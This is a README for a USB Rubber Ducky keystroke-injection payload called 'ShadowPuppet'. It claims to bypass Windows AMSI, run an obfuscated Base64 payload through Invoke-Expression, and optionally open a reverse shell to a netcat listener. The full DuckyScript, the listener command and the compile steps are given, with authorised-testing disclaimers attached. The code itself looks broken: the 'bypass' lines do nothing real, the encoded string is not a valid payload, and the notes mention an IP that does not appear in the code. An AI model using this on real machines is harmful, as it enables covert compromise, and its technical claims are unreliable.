# **ShadowPuppet Payload**

## **Overview**

**ShadowPuppet** is a USB Rubber Ducky payload designed to exploit known techniques to bypass Windows AMSI (Antimalware Scan Interface) protections, download an obfuscated payload, and execute it on a target machine. The payload uses PowerShell scripting to deliver the attack in a stealthy manner, making it more difficult for traditional security measures like antivirus or anti-malware programs to detect.

This is a powerful demonstration of how attackers can bypass basic defenses. This payload should only be used for educational purposes or in controlled penetration testing environments where you have explicit permission to perform testing.

---

## **Key Features**

* **AMSI Bypass**: The payload uses PowerShell techniques to bypass AMSI, a security feature designed to prevent the execution of malicious scripts.
* **Obfuscated Payload**: The payload is Base64 encoded to hide its true nature from security tools, making it harder to detect.
* **Reverse Shell**: (Can be added) The final payload could establish a reverse shell connection to the attacker's machine for full control of the compromised system.

---

## **Requirements**

Before using **ShadowPuppet**, ensure that you have the following:

1. **USB Rubber Ducky**: This device mimics a keyboard and automatically types out commands when plugged into a system.
2. **PowerShell**: PowerShell is required on the target machine (default in most Windows operating systems).
3. **Attacker's Machine**: A machine used to listen for reverse shell connections. (Netcat or a similar tool can be used for this purpose).
4. **Network Connection**: The payload may require internet access to download the final payload or connect back to the attacker’s machine (for reverse shells).

---

## **How to Use**

### **Attacker's Machine Setup**

1. **Start the listener on your machine** to receive the reverse shell:

   ```bash
   nc -lvp YOUR_PORT
   ```

   Replace `YOUR_PORT` with a port number that will be listening for incoming connections.

2. **Compile the payload** using DuckEncoder:

   Download [DuckEncoder](https://github.com/hak5darren/USB-Rubber-Ducky/wiki/DuckEncoder), and run:

   ```bash
   java -jar DuckEncoder.jar -i payload.txt -o inject.bin
   ```

   This will generate the `inject.bin` file that you can load onto the USB Rubber Ducky.

3. **Copy the Payload to Rubber Ducky**:

   Copy the `inject.bin` file to the Rubber Ducky and plug it into the target machine. The payload will run automatically.

---

## **Payload Code**

Here is the full code you will need for the `payload.txt` file to be compiled into `inject.bin`:

```plaintext
DELAY 500
GUI r
DELAY 500
STRING powershell
ENTER
DELAY 1000

REM Bypass AMSI using PowerShell known method
STRING $bypass = "[System.Reflection.Assembly]::LoadWithPartialName('System.Management.Automation')"
ENTER
DELAY 500
STRING $bypass += "; [System.Management.Automation.PSCommand]::new('function Test { if($args[0] -eq 1) {return} else {return}}').Invoke(1)"
ENTER
DELAY 500

REM Obfuscated payload downloader using PowerShell
STRING $payload = "JAB3AHYAYwB6aXn4cTp2YfhgA2Stw5kOrP5pQ5O72cm8aLg72g=="  REM Example Base64 encoded payload (encrypted)
ENTER
DELAY 500

STRING $decoded = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($payload))
ENTER
DELAY 500

STRING Invoke-Expression $decoded
ENTER
DELAY 500

STRING Write-Host "Payload executed successfully."
ENTER
```

---

## **Important Notes**

* **Replace the IP and Port**: Ensure you replace the necessary values in the payload with the IP and port for your reverse shell listener.
* **Test in a Controlled Environment**: Only test this payload in a controlled, ethical penetration testing environment with the proper permissions.
* **Legal Considerations**: This tool is intended for educational purposes or authorized testing only. Unauthorized access to systems is illegal and can result in severe legal consequences.
